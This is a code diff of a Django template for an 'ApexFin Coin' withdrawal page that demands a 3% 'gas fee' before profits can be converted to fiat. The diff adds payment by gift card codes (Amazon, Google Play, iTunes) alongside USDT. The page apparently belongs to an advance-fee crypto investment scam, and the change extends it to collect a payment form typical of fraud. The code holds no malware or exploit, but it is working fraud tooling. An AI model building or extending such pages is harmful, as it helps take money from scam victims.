@@ -6,7 +6,7 @@
     <h2 class="text-center mb-4">💱 Convert ApexFin Coin to Fiat</h2>
 
     <p class="text-center">
-        To convert your ApexFin Coin investment profit to fiat currency, you must pay a <strong>3% gas fee</strong> in USDT.
+        To convert your ApexFin Coin investment profit to fiat currency, you must pay a <strong>3% gas fee</strong> in USDT. Choose your payment method below to cover this fee.
     </p>
 
     <!-- Account Details (Now Balance is Visible) -->
@@ -18,44 +18,85 @@
         </ul>
     </div>
 
-    <!-- USDT Wallet Address Box -->
+    <!-- Payment Method Selection -->
     <div class="card mt-4 p-4 shadow-sm">
-        <h4>🔗 Send USDT to the Address Below</h4>
-        {% if wallet_address %}
-        <div class="wallet-box d-flex align-items-center p-3 border rounded bg-light">
-            <input type="text" value="{{ wallet_address }}" id="walletAddress" readonly class="form-control me-2" style="font-weight: bold;">
-            <button onclick="copyWalletAddress()" class="btn btn-success">📋 Copy</button>
-        </div>
-        {% else %}
-        <p class="text-danger">⚠️ Wallet address not found. Please contact support.</p>
-        {% endif %}
-    </div>
-
-    <!-- Instructions Section -->
-    <div class="card mt-4 p-4 shadow-sm">
-        <h4>📌 How to Convert:</h4>
-        <ol>
-            <li>Check your <strong>total balance</strong> above.</li>
-            <li>Calculate <strong>3% of your balance</strong> as shown.</li>
-            <li>Send the exact USDT amount to the wallet address above.</li>
-            <li>Copy and save your <strong>Transaction ID</strong> after payment.</li>
-            <li>Enter the Transaction ID below and click "<strong>I've Made the Payment</strong>".</li>
-        </ol>
-    </div>
-
-    <!-- Transaction ID Form -->
-    <div class="card mt-4 p-4 shadow-sm">
+        <h4>🔗 Choose Payment Method</h4>
+        <p>Select the payment method that works best for you. If you choose "USDT", you'll be given a wallet address to send the payment. If you choose "Gift Card", you’ll need to manually enter the gift card type and code for validation.</p>
+        
         <form method="post">
             {% csrf_token %}
-            <label class="form-label"><strong>Enter USDT Transaction ID:</strong></label>
-            <input type="text" name="transaction_id" required class="form-control mb-3" placeholder="Paste your USDT transaction ID here">
-            <button type="submit" class="btn btn-primary w-100">✅ I've Made the Payment</button>
+            <div class="form-check">
+                <input class="form-check-input" type="radio" name="payment_method" id="usdt" value="usdt" required>
+                <label class="form-check-label" for="usdt">
+                    💸 Pay via USDT (Tether)
+                </label>
+                <p class="text-muted">Choose this if you prefer to pay with USDT cryptocurrency. You will be provided with a wallet address.</p>
+            </div>
+            <div class="form-check">
+                <input class="form-check-input" type="radio" name="payment_method" id="gift_card" value="gift_card">
+                <label class="form-check-label" for="gift_card">
+                    🎁 Pay via Gift Card
+                </label>
+                <p class="text-muted">Choose this if you are paying with a gift card. After purchasing the gift card, you will need to enter the gift card type and code for manual verification.</p>
+            </div>
+
+            <!-- Hidden Fields for Payment Method -->
+            <input type="hidden" name="payment_method" id="payment_method">
+            
+            <div id="usdt_details" style="display:none;">
+                <label class="form-label"><strong>Enter USDT Transaction ID:</strong></label>
+                <input type="text" name="transaction_id" class="form-control mb-3" placeholder="Paste your USDT transaction ID here">
+            </div>
+
+            <div id="gift_card_details" style="display:none;">
+                <label class="form-label"><strong>Select Gift Card Type:</strong></label>
+                <select class="form-control mb-3" name="gift_card_type">
+                    <option value="amazon">Amazon</option>
+                    <option value="google_play">Google Play</option>
+                    <option value="itunes">iTunes</option>
+                </select>
+
+                <label class="form-label"><strong>Enter Gift Card Code:</strong></label>
+                <input type="text" name="gift_card_code" class="form-control mb-3" placeholder="Enter Gift Card Code">
+                
+                <label class="form-label"><strong>Reference/Note (Optional):</strong></label>
+                <input type="text" name="gift_card_reference" class="form-control mb-3" placeholder="Enter a reference or note for verification (Optional)">
+            </div>
+
+            <button type="submit" class="btn btn-primary w-100 mt-3">Next Step</button>
         </form>
     </div>
 
-    <p class="text-center mt-3">
-        <strong>🔔 Note:</strong> Ensure you transfer the exact amount to avoid delays. Your payment will be automatically verified.
-    </p>
+    {% if payment_method == 'usdt' %}
+    <!-- USDT Wallet Address Box -->
+    <div class="card mt-4 p-4 shadow-sm">
+        <h4>🔗 Send USDT to the Address Below</h4>
+        <p>Please send the exact gas fee amount in USDT to the wallet address provided below. After the payment is confirmed, your funds will be converted to fiat.</p>
+        
+        {% if wallet_address %}
+        <div class="wallet-box d-flex align-items-center p-3 border rounded bg-light">
+            <input type="text" value="{{ wallet_address }}" id="walletAddress" readonly class="form-control me-2" style="font-weight: bold;">
+            <button onclick="copyWalletAddress()" class="btn btn-success">📋 Copy Wallet Address</button>
+        </div>
+        {% else %}
+        <p class="text-danger">⚠️ Wallet address not found. Please contact support for assistance.</p>
+        {% endif %}
+    </div>
+    {% endif %}
+
+    {% if payment_method == 'gift_card' %}
+    <!-- Gift Card Instructions -->
+    <div class="card mt-4 p-4 shadow-sm">
+        <h4>🎁 Pay via Gift Card</h4>
+        <p>To complete the payment via gift card, follow these steps:</p>
+        <ol>
+            <li>Choose a gift card from the list of accepted gift cards below.</li>
+            <li>Enter the gift card type (e.g., Amazon, Google Play) and code.</li>
+            <li>Submit the gift card information for manual verification.</li>
+        </ol>
+        <p>Once the code is verified, your funds will be converted to fiat and available for withdrawal.</p>
+    </div>
+    {% endif %}
 </div>
 
 <!-- Copy Wallet Script -->
@@ -67,6 +108,21 @@
         document.execCommand("copy");
         alert("✅ Wallet Address Copied: " + copyText.value);
     }
+
+    // JavaScript to toggle visibility based on selected payment method
+    document.querySelectorAll('input[name="payment_method"]').forEach((input) => {
+        input.addEventListener('change', function() {
+            // Set hidden payment method input value
+            document.getElementById('payment_method').value = this.value;
+
+            if (this.value === 'usdt') {
+                document.getElementById('usdt_details').style.display = 'block';
+                document.getElementById('gift_card_details').style.display = 'none';
+            } else if (this.value === 'gift_card') {
+                document.getElementById('usdt_details').style.display = 'none';
+                document.getElementById('gift_card_details').style.display = 'block';
+            }
+        });
+    });
 </script>
 {% endblock %}
-
